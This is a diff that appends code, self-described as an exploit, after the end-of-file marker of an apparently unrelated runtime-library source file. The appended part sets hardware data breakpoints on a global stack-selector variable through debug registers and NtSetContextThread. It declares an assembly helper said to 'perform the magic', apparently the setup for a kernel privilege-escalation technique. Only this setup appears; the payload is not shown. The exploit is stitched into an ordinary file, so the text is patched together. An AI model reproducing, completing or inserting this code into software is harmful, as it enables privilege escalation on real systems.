@@ -1038,3 +1038,91 @@ RtlGetTickCount(VOID)
 }
 
 /* EOF */
+//////////////////////////////////////////////
+
+
+#if !defined(_M_AMD64)
+#error "This exploit must be compiled as 64-bit code."
+#endif
+
+#pragma warning(push, 0)
+#include <windows.h>
+#pragma warning(pop)
+
+// The X86 architecture supports only 4 debug registers: DR0, DR1, DR2, and 
+// DR3.
+enum DEBUG_REGISTERS
+{
+    DR0 = 0,
+    DR1 = 1,
+    DR2 = 2,
+    DR3 = 3
+};
+
+// A hardware breakpoint can be from 1 to 4 (8 on X64) bytes in size.
+enum BREAKPOINT_SIZE
+{
+    One = 0,
+    Two = 1,
+    Eight = 2,
+    Four = 3
+};
+
+// A hardware breakpoint can occur on data WRITE, ACCESS (READ/WRITE), or 
+// EXECUTE.
+enum BREAKPOINT_TYPE
+{
+    Type_Write = 1,
+    Type_Access = 3,
+    Type_Execute = 0
+};
+
+// The pseudo-handle for the current thread.
+//#define NtCurrentThread()		((HANDLE)-2)
+
+// This is the global memory address we apply the hardware breakpoint on.
+WORD StackSelector = 0;
+
+// A helper function in assembly that performs the magic.
+void __cdecl Execute();
+
+/*
+*	Sets a data breakpoint (hardware breakpoint) on a user-supplied address.
+*/
+uintptr_t
+__stdcall
+SetDataBreakpoint(
+    _In_ uintptr_t				Address,
+    _In_ enum BREAKPOINT_SIZE		Size,
+    _In_ enum DEBUG_REGISTERS		Register,
+    _In_ enum BREAKPOINT_TYPE		Type)
+{
+    __declspec(align(16)) CONTEXT Context;
+
+    // 17.2.4: Debug Control Register (DR7)
+    static uintptr_t DR7 = 0;
+
+    // L0 through L3 (local breakpoint enable) flags (bits 0, 2, 4, and 6)
+    DR7 |= ((uintptr_t)1 << ((uintptr_t)Register << (uintptr_t)1));
+
+    // R/W0 through R/W3 (read/write) fields (bits 16, 17, 20, 21, 24, 25, 28,
+    // and 29)
+    DR7 |= ((uintptr_t)Type << (((uintptr_t)Register << 2) + 16));
+
+    // LEN0 through LEN3 (Length) fields (bits 18, 19, 22, 23, 26, 27, 30, and
+    // 31)
+    DR7 |= ((uintptr_t)Size << (((uintptr_t)Register << 2) + 18));
+
+    memset(&Context, 0, sizeof(CONTEXT));
+
+    // Adjust the hardware breakpoints (only).
+    Context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    // Adjust the DR* contents for this thread.
+    ((uintptr_t*)& Context.Dr0)[(uintptr_t)Register] = Address;
+    Context.Dr7 = DR7;
+
+    BOOL bSuccess = NtSetContextThread(NtCurrentThread(), &Context);
+
+    return ((bSuccess) ? Address : 0);
+}
